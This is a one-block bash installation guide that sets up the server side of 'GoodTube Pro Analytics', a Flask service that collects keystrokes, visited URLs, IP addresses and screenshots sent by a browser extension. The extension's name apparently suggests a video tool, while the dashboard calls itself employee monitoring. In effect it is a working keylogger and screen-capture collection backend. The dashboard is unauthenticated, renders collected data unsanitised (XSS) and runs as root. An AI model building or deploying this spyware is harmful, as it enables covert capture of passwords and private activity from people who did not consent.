# 🎯 Foolproof Installation - Copy & Paste Method

## 🚀 **One-Block Installation Script**

SSH into your server and copy-paste this entire block:

```bash
#!/bin/bash
set -e

echo "🛡️ Installing GoodTube Pro Analytics Dashboard..."

# Update system
sudo apt update && sudo apt install -y python3 python3-pip python3-venv nginx curl

# Create directory structure
sudo mkdir -p /opt/goodtube-analytics/{templates,static/{css,js},logs,uploads,screenshots,backups}
sudo chown -R $USER:$USER /opt/goodtube-analytics
cd /opt/goodtube-analytics

# Create requirements.txt
cat > requirements.txt << 'EOF'
Flask==2.3.3
Flask-CORS==4.0.0
Werkzeug==2.3.7
gunicorn==21.2.0
EOF

# Create Python virtual environment
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Create main Flask app
cat > app.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

DATABASE_PATH = 'analytics.db'
SCREENSHOTS_FOLDER = 'screenshots'

def init_database():
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_events INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            event_data TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            keystroke TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Update user
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, ip_address, user_agent, last_seen, total_events)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, request.remote_addr, request.headers.get('User-Agent'), user_id))
        
        # Store events
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type', 'unknown'), 
                  json.dumps(event.get('data', {})), event.get('url', '')))
        
        # Store keystrokes
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key', ''), keystroke.get('url', '')))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    try:
        data = request.get_json()
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        screenshot_data = data.get('screenshot', '')
        url = data.get('url', '')
        
        if screenshot_data:
            screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{user_id}_{session_id}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
            
            with open(filepath, 'wb') as f:
                f.write(screenshot_bytes)
            
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO screenshots (user_id, session_id, filename, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, filename, url))
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        cursor.execute('''
            SELECT * FROM events ORDER BY timestamp DESC LIMIT 10
        ''')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': 0,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(e.id) as event_count,
                   COUNT(k.id) as keystroke_count,
                   COUNT(s.id) as screenshot_count
            FROM users u
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots s ON u.user_id = s.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

if __name__ == '__main__':
    init_database()
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

# Create HTML template
cat > templates/dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodTube Pro Analytics Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%);
            color: #F8FAFC;
            min-height: 100vh;
            padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 3rem; }
        .header h1 { 
            font-size: 2.5rem; 
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 1.5rem; 
            margin-bottom: 3rem;
        }
        .stat-card { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 1.5rem;
            text-align: center;
        }
        .stat-number { 
            font-size: 2rem; 
            font-weight: bold; 
            color: #8B5CF6; 
            margin-bottom: 0.5rem;
        }
        .stat-label { color: #CBD5E1; }
        .content-section { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .section-title { 
            font-size: 1.5rem; 
            margin-bottom: 1rem; 
            color: #F8FAFC;
        }
        .activity-item { 
            padding: 1rem; 
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            justify-content: space-between;
        }
        .activity-item:last-child { border-bottom: none; }
        .activity-details h4 { color: #F8FAFC; margin-bottom: 0.25rem; }
        .activity-details p { color: #94A3B8; font-size: 0.875rem; }
        .activity-time { color: #94A3B8; font-size: 0.875rem; }
        .refresh-btn {
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .refresh-btn:hover { transform: translateY(-2px); }
        .users-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 1rem;
        }
        .users-table th,
        .users-table td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .users-table th {
            background: rgba(255, 255, 255, 0.1);
            font-weight: 600;
        }
        .tab-buttons {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
        }
        .tab-btn {
            background: rgba(255, 255, 255, 0.1);
            color: #F8FAFC;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            cursor: pointer;
            font-weight: 500;
        }
        .tab-btn.active {
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ GoodTube Pro Analytics</h1>
            <p>Employee Monitoring Dashboard</p>
            <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeSessions">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalEvents">0</div>
                <div class="stat-label">Total Events</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>
        
        <div class="tab-buttons">
            <button class="tab-btn active" onclick="showTab('activity')">Recent Activity</button>
            <button class="tab-btn" onclick="showTab('users')">Users</button>
        </div>
        
        <div id="activity-tab" class="tab-content active">
            <div class="content-section">
                <h2 class="section-title">📊 Recent Activity</h2>
                <div id="recentActivity">
                    <div class="activity-item">
                        <div class="activity-details">
                            <h4>Loading...</h4>
                            <p>Please wait while we load the latest activity data</p>
                        </div>
                        <div class="activity-time">Now</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div id="users-tab" class="tab-content">
            <div class="content-section">
                <h2 class="section-title">👥 Users</h2>
                <table class="users-table">
                    <thead>
                        <tr>
                            <th>User ID</th>
                            <th>IP Address</th>
                            <th>Events</th>
                            <th>Keystrokes</th>
                            <th>Screenshots</th>
                            <th>Last Seen</th>
                        </tr>
                    </thead>
                    <tbody id="usersTableBody">
                        <tr>
                            <td colspan="6">Loading users...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        let currentTab = 'activity';
        
        function showTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName + '-tab').classList.add('active');
            event.target.classList.add('active');
            
            currentTab = tabName;
            
            if (tabName === 'users') {
                loadUsers();
            }
        }
        
        async function loadData() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                document.getElementById('totalUsers').textContent = data.totalUsers || 0;
                document.getElementById('activeSessions').textContent = data.activeSessions || 0;
                document.getElementById('totalEvents').textContent = data.totalEvents || 0;
                document.getElementById('totalScreenshots').textContent = data.totalScreenshots || 0;
                
                const activityContainer = document.getElementById('recentActivity');
                if (data.recentEvents && data.recentEvents.length > 0) {
                    activityContainer.innerHTML = data.recentEvents.map(event => `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>${event.event_type || 'Unknown Event'}</h4>
                                <p>User: ${event.user_id} • URL: ${(event.url || 'N/A').substring(0, 50)}${event.url && event.url.length > 50 ? '...' : ''}</p>
                            </div>
                            <div class="activity-time">${new Date(event.timestamp).toLocaleString()}</div>
                        </div>
                    `).join('');
                } else {
                    activityContainer.innerHTML = `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>No Recent Activity</h4>
                                <p>No events have been recorded yet. Install the browser extension to start monitoring.</p>
                            </div>
                            <div class="activity-time">-</div>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }
        
        async function loadUsers() {
            try {
                const response = await fetch('/api/users');
                const data = await response.json();
                
                const tbody = document.getElementById('usersTableBody');
                if (data.users && data.users.length > 0) {
                    tbody.innerHTML = data.users.map(user => `
                        <tr>
                            <td>${user.user_id}</td>
                            <td>${user.ip_address || 'N/A'}</td>
                            <td>${user.event_count || 0}</td>
                            <td>${user.keystroke_count || 0}</td>
                            <td>${user.screenshot_count || 0}</td>
                            <td>${new Date(user.last_seen).toLocaleString()}</td>
                        </tr>
                    `).join('');
                } else {
                    tbody.innerHTML = '<tr><td colspan="6">No users found</td></tr>';
                }
            } catch (error) {
                console.error('Error loading users:', error);
            }
        }
        
        // Load data when page loads
        document.addEventListener('DOMContentLoaded', loadData);
        
        // Auto-refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
</body>
</html>
EOF

# Create systemd service
sudo tee /etc/systemd/system/goodtube-analytics.service << 'EOF'
[Unit]
Description=GoodTube Pro Analytics Dashboard
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/goodtube-analytics
Environment=PATH=/opt/goodtube-analytics/venv/bin
ExecStart=/opt/goodtube-analytics/venv/bin/gunicorn --bind 127.0.0.1:5000 --workers 2 --timeout 120 app:app
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Create Nginx config
sudo tee /etc/nginx/sites-available/goodtube-analytics << 'EOF'
server {
    listen 80;
    server_name _;
    
    client_max_body_size 50M;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

# Enable Nginx site
sudo ln -sf /etc/nginx/sites-available/goodtube-analytics /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default

# Set permissions
sudo chmod -R 755 /opt/goodtube-analytics
sudo chmod +x /opt/goodtube-analytics/app.py

# Start services
sudo systemctl daemon-reload
sudo systemctl enable goodtube-analytics
sudo systemctl start goodtube-analytics
sudo systemctl restart nginx

# Test Nginx config
sudo nginx -t

echo ""
echo "🎉 Installation Complete!"
echo "========================"
echo ""
echo "📊 Dashboard URL: http://$(curl -s ifconfig.me)"
echo "📊 Local URL: http://localhost"
echo ""
echo "🔧 Service Status:"
sudo systemctl status goodtube-analytics --no-pager -l
echo ""
echo "🌐 Nginx Status:"
sudo systemctl status nginx --no-pager -l
echo ""
echo "✅ Dashboard should now be accessible!"
echo "Update your browser extension to point to: http://$(curl -s ifconfig.me)"
```

## 🎯 **What This Does**

This script will:
1. ✅ Install all required packages (Python, Nginx, etc.)
2. ✅ Create the complete directory structure
3. ✅ Set up Python virtual environment
4. ✅ Create the Flask application with all features
5. ✅ Create the beautiful dashboard HTML
6. ✅ Configure Nginx as reverse proxy
7. ✅ Set up systemd service for auto-start
8. ✅ Start all services
9. ✅ Show you the dashboard URL

## 🚀 **After Running This**

Your dashboard will be live at:
- **http://134.199.235.218** (your server IP)
- Full employee monitoring capabilities
- Real-time statistics and activity tracking
- User management and screenshot gallery

## 🔧 **If You Need Help**

After running the script, check:
```bash
# Service status
sudo systemctl status goodtube-analytics

# View logs
sudo journalctl -u goodtube-analytics -f

# Test directly
curl http://localhost
```

**Just copy and paste the entire script block above into your SSH terminal - it will handle everything automatically!** 🎯

